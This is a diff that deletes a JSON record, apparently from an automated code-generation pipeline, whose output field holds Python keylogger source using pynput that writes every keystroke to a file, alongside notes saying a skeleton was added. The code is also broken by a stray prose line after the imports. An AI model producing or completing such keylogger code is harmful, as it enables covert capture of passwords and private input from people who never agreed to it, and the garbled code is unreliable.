@@ -1,8 +1,0 @@
-{
-  "output": "import time\ncapturing the actual keystrokes.\nfrom pynput.keyboard import KeyCode, Key, Listener\n\nwith open('keylogs.txt', 'a') as file:\n    def on_press(key):\n        try:\n            key = key.char\n        except AttributeError:\n            key = str(key)\n        print(f'Key pressed: {key}')\n        file.write(key + '\\n')\n        file.flush()\n    def on_release(key):\n        if key == Key.esc:\n            return False\n        else:\n            print(f'Key released: {key}')\n    with Listener(on_press=on_press, on_release=on_release) as listener:\n        listener.join()",
-  "notes": "Added basic skeleton and imports. Needs further adjustments.",
-  "applied_fixes": [
-    "iteration1_issue2"
-  ],
-  "iterations": 2
-}
